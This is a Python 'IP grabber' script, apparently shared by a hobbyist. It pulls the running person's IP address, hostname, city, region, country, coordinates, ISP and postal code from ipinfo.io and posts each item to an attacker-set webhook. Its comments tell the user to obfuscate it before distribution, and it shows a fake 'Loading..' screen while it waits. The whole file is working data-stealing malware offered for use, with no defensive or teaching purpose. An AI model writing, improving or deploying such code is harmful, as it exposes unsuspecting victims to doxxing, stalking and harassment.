#Made by opw and yes wack
#Run the script and put your webhook and then obfuscate it with https://development-tools.net/python-obfuscator
#modules
credits = """
    Made By Opw
    
    Discord = "opw#7777"

    Github = "github.com/Opwwww"
"""
from colorama import init,Fore
from os import system
import requests as r,json
import time
time.sleep(3)
system("cls")
init(convert=True)
print(Fore.GREEN + "Loading.. ")
#username of the webhook
user = "USERNAME"
#avatar of the webhook 
avatar = "https://64.media.tumblr.com/4251274b58928d74cb7821452eed9f87/19a1d45f32ed62d4-e1/s1280x1920/fef7d91e691090c0a86be11d33cdc75ec9fe0442.gifv"
#Website to get the information
yes = r.get("https://ipinfo.io/json")
#webhook (ed it this)
webhook = "WEBHOOK HERE"
print(Fore.RED + "If program doesn't work then off your vpn and restart.")
time.sleep(9999)
#Ip adress and more things.
ip = {
  "content": "IP Adress: " + json.loads(yes.content)["ip"],
  "username": user,
  "avatar_url": avatar,
}
city = {
  "content": "City: " + json.loads(yes.content)["city"],
  "username": user,
  "avatar_ur": avatar,
}

hostname = {
  "content": "Hostname: " + json.loads(yes.content)["hostname"],
  "username": user,
  "avatar_url": avatar,
}
region = {
  "content": "Region: " + json.loads(yes.content)["region"],
  "username": user,
  "avatar_url": avatar,
}
country = {
  "content": "Country: " + json.loads(yes.content)["country"],
  "username": user,
  "avatar_url": avatar,
}
loc = {
  "content": "Loc: " + json.loads(yes.content)["loc"],
  "username": user,
  "avatar_url": avatar,
}
org = {
  "content": "Org: " + json.loads(yes.content)["org"],
  "username": user,
  "avatar_url": avatar,
}
postal = {
  "content": "Postal Code: " + json.loads(yes.content)["postal"],
  "username": user,
  "avatar_url": avatar,
}
timezone= {
  "content": "Timezone: " + json.loads(yes.content)["timezone"],
  "username": user,
  "avatar_url": avatar,
}
headers = {    
"Content-Type": "application/json"
}
ip = r.post(webhook, data=json.dumps(ip), headers=headers,json=ip)
hostname = r.post(webhook, data=json.dumps(hostname), headers=headers,json=hostname)
city = r.post(webhook, data=json.dumps(city), headers=headers,json=city)
region = r.post(webhook, data=json.dumps(region), headers=headers,json=region)
country = r.post(webhook, data=json.dumps(country), headers=headers,json=country)
loc = r.post(webhook, data=json.dumps(loc), headers=headers,json=loc)
org = r.post(webhook, data=json.dumps(org), headers=headers,json=org)
postal = r.post(webhook, data=json.dumps(postal), headers=headers,json=postal)
timezone = r.post(webhook, data=json.dumps(timezone), headers=headers,json=timezone)
